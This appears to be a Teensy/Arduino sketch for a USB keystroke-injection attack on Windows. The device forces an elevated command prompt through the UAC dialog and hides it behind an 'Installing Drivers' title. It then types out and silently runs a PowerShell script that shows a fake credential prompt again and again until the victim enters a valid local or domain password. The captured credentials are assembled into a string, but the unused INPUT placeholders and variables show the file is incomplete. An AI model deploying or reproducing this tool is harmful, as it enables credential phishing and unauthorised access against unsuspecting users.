#define TEENSY3
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("echo $ErrorActionPreference=\"SilentlyContinue\" > %temp%\\cr.ps1");
  Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\cr.ps1");
  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\cr.ps1");
  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\cr.ps1");
  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Credentials\" >> %temp%\\cr.ps1");
  Keyboard.println("echo Add-Type -assemblyname system.DirectoryServices.accountmanagement  >> %temp%\\cr.ps1");
  Keyboard.println("echo $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) >> %temp%\\cr.ps1");
  Keyboard.println("echo $dn = \"LDAP://\" + ([ADSI]\"\").distinguishedName >> %temp%\\cr.ps1");
  Keyboard.println("echo while(1){ >> %temp%\\cr.ps1");
  Keyboard.println("echo $cr = $host.ui.PromptForCredential(\"Need credentials\", \"Please enter your user name and password.\", \"\", \"\") >> %temp%\\cr.ps1");
  Keyboard.println("echo if($cr){ >> %temp%\\cr.ps1");
  Keyboard.println("echo $creds = $cr.GetNetworkCredential() >> %temp%\\cr.ps1");
  Keyboard.println("echo [String]$u = $creds.username >> %temp%\\cr.ps1");
  Keyboard.println("echo [String]$p = $creds.password >> %temp%\\cr.ps1");
  Keyboard.println("echo [String]$domain = $creds.domain >> %temp%\\cr.ps1");
  Keyboard.println("echo $al = $DS.ValidateCredentials($u, $p) >> %temp%\\cr.ps1");
  Keyboard.println("echo $ad = New-Object System.DirectoryServices.DirectoryEntry($dn,$u,$p) >> %temp%\\cr.ps1");
  Keyboard.println("echo if(($al -eq $true) -or ($ad.name -ne $null)){ >> %temp%\\cr.ps1");
  Keyboard.println("echo $pv = \"Username: \" + $u + \" Password: \" + $p + \" Domain:\" + $domain >> %temp%\\cr.ps1");
  Keyboard.println("echo break}}} >> %temp%\\cr.ps1");


  String fn = "cr";
  String fp;
  


  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\cr.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\cr.ps1\"),0,true >> %temp%\\cr.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\cr.vbs");
  delay(1000);
  Keyboard.println("exit");

}

void loop(){
}
  void wait_for_drivers(int sleep)
{
bool CapsLockTrap = is_caps_on();
while(CapsLockTrap == is_caps_on())
{
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(sleep);
}
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(sleep);
}

int ledkeys(void) {return int(keyboard_leds);}

bool is_caps_on(void) {return ((ledkeys() & 2) == 2) ? true : false;}

bool cmd_admin(int reps, int millisecs)
{
make_sure_capslock_is_off();
delay(700);
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.send_now();
delay(3000);
Keyboard.print("cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\"");
delay(2000);
Keyboard.set_modifier(MODIFIERKEY_CTRL);
Keyboard.send_now();
Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
Keyboard.send_now();
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(7000);
send_left_enter();
delay(4000);
create_click_capslock_win();
check_for_capslock_success_teensy(reps,millisecs);
}

bool cmd(int reps, int millisecs, char *SomeCommand)
{
make_sure_capslock_is_off();
delay(700);
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_R);
Keyboard.send_now();

delay(500);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();

Keyboard.print(SomeCommand);
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();

Keyboard.set_key1(0);
Keyboard.send_now();

delay(3000);
create_click_capslock_win();
check_for_capslock_success_teensy(reps,millisecs);
}

void make_sure_capslock_is_off(void)
{
if (is_caps_on())
{
delay(500);
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
delay(700);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(700);
}
}

void create_click_capslock_win()
{
Keyboard.println("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{CAPSLOCK}\" > %temp%\\capslock.vbs");
delay(400);
Keyboard.println("wscript %temp%\\capslock.vbs");
delay(2000);
}

bool check_for_capslock_success_teensy(int reps, int millisecs)
{
unsigned int i = 0;
do
{
delay(millisecs);
if (is_caps_on())
{
make_sure_capslock_is_off();
delay(700);
return true;
}
i++;
}
while (!is_caps_on() && (i<reps));
return false;
}

void minimise_windows(void)
{
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_M);
Keyboard.send_now();
delay(300);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(300);
}

void reset_windows_desktop(int sleep)
{
delay(1000);
minimise_windows();
delay(sleep);
minimise_windows();
delay(sleep);
minimise_windows();
delay(200);
}

void send_left_enter(){
  delay(1000);
  Keyboard.set_key1(KEY_LEFT);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  }


  
